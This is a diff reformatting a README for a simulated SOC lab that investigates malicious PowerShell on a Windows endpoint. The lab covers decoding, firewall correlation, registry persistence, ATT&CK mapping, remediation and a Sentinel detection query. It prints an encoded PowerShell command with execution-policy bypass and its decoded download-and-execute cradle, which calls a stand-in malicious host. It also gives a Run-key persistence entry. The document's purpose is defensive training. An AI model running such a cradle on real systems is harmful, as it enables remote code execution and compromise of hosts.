@@ -1,141 +1,152 @@
-Windows Endpoint PowerShell Compromise Investigation Lab
+# Windows Endpoint PowerShell Compromise Investigation Lab
 
-Overview
+## Overview
 
-This project simulates the detection and full investigation of a malicious PowerShell execution on a Windows 10 endpoint.
+This project simulates a real-world SOC investigation into suspicious PowerShell activity on a Windows 10 endpoint.
 
-The objective was to determine whether the activity was malicious, identify persistence mechanisms, map techniques to MITRE ATT&CK, and recommend containment actions.
+The objective was to:
 
-This lab mirrors a real SOC investigation workflow using Windows Security Event Logs and PowerShell logging.
+- Determine whether activity was malicious
+- Decode and analyze the executed command
+- Identify persistence mechanisms
+- Correlate process and network telemetry
+- Map activity to MITRE ATT&CK
+- Propose detection and remediation actions
 
-Scenario
+This lab reflects a realistic Tier 1 to Tier 2 SOC escalation case.
 
-A high severity alert was triggered after PowerShell executed with a Base64 encoded command.
+---
 
-Initial telemetry indicated:
+## Scenario
 
-Event ID 4688 – New process created
-Process: powershell.exe
-Command Line contained: -enc (encoded command)
-Suspicious outbound network activity shortly after execution
+A high severity alert was triggered due to PowerShell executing with:
 
-The investigation aimed to determine:
+- Encoded command (-enc)
+- ExecutionPolicy Bypass
+- Subsequent outbound network activity
 
-• What the encoded command executed
-• Whether persistence was established
-• If command and control communication occurred
-• Impact and recommended remediation
+This combination is frequently associated with malware loaders and initial access activity.
 
-Initial Alert Details
+---
 
-Event ID: 4688
-Parent Process: explorer.exe
-New Process: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
-Command Line:
+## Initial Alert Details
+
+**Event ID:** 4688  
+**New Process:** powershell.exe  
+**Parent Process:** explorer.exe  
+**Command Line:**
 
 powershell.exe -NoProfile -ExecutionPolicy Bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiaAB0AHQAcAA6AC8ALwBtAGEAbABpAGMAaQBvAHUAcwAtAHMAaQB0AGUALgBjAG8AbQAvAHAAaABwAC4AZQB4AGUAIgApAA==
 
-Encoded commands combined with ExecutionPolicy Bypass are strong indicators of malicious execution.
+Encoded PowerShell combined with ExecutionPolicy Bypass is a strong indicator of malicious execution.
 
-Analysis Steps
+---
 
-Step 1 – Decode PowerShell Command
+## Investigation Steps
 
-Decoded payload revealed:
+### 1. Command Decoding
+
+The Base64 payload decoded to:
 
 IEX (New-Object Net.WebClient).DownloadString("http://malicious-site.com/php.exe")
 
-This confirms the script attempted to download and execute a remote payload.
+This confirms an attempt to download and execute a remote payload.
 
-Step 2 – Network Activity Review
+---
 
-Windows Firewall log indicated outbound connection to:
+### 2. Network Activity Correlation
 
-Destination IP: 185.234.219.12
-Port: 80
-Domain: malicious-site.com
+Firewall logs showed:
 
-This behavior aligns with command and control communication or payload retrieval.
+- Destination IP: 185.234.219.12
+- Port: 80
+- Domain: malicious-site.com
 
-Step 3 – Persistence Investigation
+This occurred within seconds of PowerShell execution.
 
-Registry analysis revealed a new Run key:
+This behavior is consistent with tool transfer or command and control activity.
 
-HKCU\Software\Microsoft\Windows\CurrentVersion\Run
-Value Name: Updater
-Data: C:\Users\Public\php.exe
+---
 
-This indicates persistence via registry autorun.
+### 3. Persistence Check
 
-Step 4 – Process Tree Review
+Registry modification observed:
 
-Process chain observed:
+HKCU\Software\Microsoft\Windows\CurrentVersion\Run  
+Value Name: Updater  
+Data: C:\Users\Public\php.exe  
 
-explorer.exe
-  └── powershell.exe
-        └── php.exe
+This confirms persistence via Registry Run key.
 
-This confirms payload execution.
+---
 
-MITRE ATT&CK Mapping
+### 4. Process Tree Analysis
 
-T1059.001 – Command and Scripting Interpreter: PowerShell
-T1105 – Ingress Tool Transfer
-T1547.001 – Registry Run Keys / Startup Folder
-T1055 – Process Injection (potential follow-on activity)
+Process chain:
 
-Findings
+explorer.exe  
+└── powershell.exe  
+  └── php.exe  
 
-Confirmed malicious PowerShell execution using encoded command.
-Remote payload downloaded and executed.
-Persistence established via registry Run key.
-Outbound communication to suspicious external host.
+This confirms payload execution following script download.
 
-This activity is consistent with initial access followed by persistence establishment.
+---
 
-Risk Assessment
+## MITRE ATT&CK Mapping
 
-Level: Critical
+- T1059.001 – Command and Scripting Interpreter: PowerShell
+- T1105 – Ingress Tool Transfer
+- T1547.001 – Registry Run Keys / Startup Folder
 
-Justification:
+---
 
-• Encoded PowerShell with execution policy bypass
-• External payload retrieval
-• Persistence mechanism established
-• Potential for lateral movement
+## Findings
 
-False Positive Considerations
+- Malicious PowerShell execution confirmed
+- Remote payload successfully downloaded
+- Persistence mechanism established
+- Outbound communication to suspicious host detected
 
-• Administrative automation script using encoded commands
-• Software installer using PowerShell
-• Legitimate remote management tools
+This activity chain is consistent with initial compromise followed by persistence establishment.
 
-However, execution policy bypass combined with external payload download and registry persistence makes this highly malicious.
+---
 
-Remediation Recommendations
+## Risk Assessment
 
-• Immediately isolate affected host
-• Remove malicious Run key
-• Delete payload from C:\Users\Public
-• Block malicious-site.com and associated IP
-• Reset affected user credentials
-• Perform full EDR sweep across environment
-• Review for lateral movement indicators
+**Severity:** Critical  
 
-Detection Logic Proposal
+**Justification:**
+
+- Encoded command execution
+- ExecutionPolicy bypass
+- External payload retrieval
+- Registry persistence
+- Potential for lateral movement
+
+---
+
+## False Positive Considerations
+
+- Administrative automation using encoded PowerShell
+- Software installation scripts
+- Legitimate remote management tools
+
+However, correlation of encoded execution, external download, and persistence significantly reduces likelihood of benign activity.
+
+---
+
+## Detection Logic Proposal
 
 Alert when:
 
-Event ID = 4688
-AND Process Name = powershell.exe
-AND CommandLine contains "-enc"
-AND ExecutionPolicy Bypass present
+- Event ID = 4688
+- Process Name = powershell.exe
+- CommandLine contains "-enc"
+- CommandLine contains "ExecutionPolicy Bypass"
 
-Escalate severity if:
+Increase severity if outbound connection occurs within 60 seconds.
 
-Outbound connection occurs within 60 seconds of execution.
-
-Example KQL (Microsoft Sentinel)
+### Example KQL (Microsoft Sentinel)
 
 SecurityEvent
 | where EventID == 4688
@@ -143,39 +154,43 @@ SecurityEvent
 | where CommandLine contains "-enc"
 | where CommandLine contains "ExecutionPolicy Bypass"
 
-Skills Demonstrated
+---
 
-Windows Event Log analysis
-PowerShell attack investigation
-Encoded payload decoding
-Persistence detection
-MITRE ATT&CK mapping
-Incident documentation
-Microsoft Sentinel detection logic
-Threat hunting methodology
+## Remediation Recommendations
 
-Evidence
+- Isolate affected host
+- Remove malicious Run key
+- Delete payload from Public directory
+- Block malicious domain and IP
+- Reset user credentials
+- Conduct environment-wide threat hunt
 
-event_logs_sample.txt – Simulated Security Event entries
-registry_artifacts.txt – Persistence evidence
-process_tree.png – Process relationship visual
-incident_report.md – Full documented investigation
+---
 
-Outcome
+## Evidence Included
 
-Malicious PowerShell-based compromise confirmed.
-Host required immediate containment and remediation.
-Detection logic created to improve future response time.
+- event_logs_sample.txt
+- registry_artifacts.txt
+- process_tree.png
+- incident_report.md
 
-Lessons Learned
+---
 
-Encoded PowerShell commands are a common initial execution method.
-ExecutionPolicy Bypass combined with -enc is high risk.
-Registry Run keys remain a common persistence technique.
-Correlating process creation with network activity increases detection confidence.
+## Skills Demonstrated
 
-Analyst Reasoning
+- Windows Event Log analysis
+- PowerShell threat investigation
+- Encoded payload decoding
+- Persistence detection
+- MITRE ATT&CK mapping
+- Incident documentation
+- Microsoft Sentinel detection logic
+- Threat hunting methodology
 
-While PowerShell usage alone is not inherently malicious, the combination of encoded commands, execution policy bypass, external payload download, and registry persistence significantly increases malicious probability.
+---
 
-Given the telemetry correlation and behavior chain, this incident would be escalated as a confirmed compromise.
+## Analyst Conclusion
+
+While PowerShell is a legitimate administrative tool, the combination of encoded command execution, policy bypass, external payload download, and registry persistence strongly indicates malicious compromise.
+
+This case would be escalated and treated as a confirmed incident requiring immediate containment.
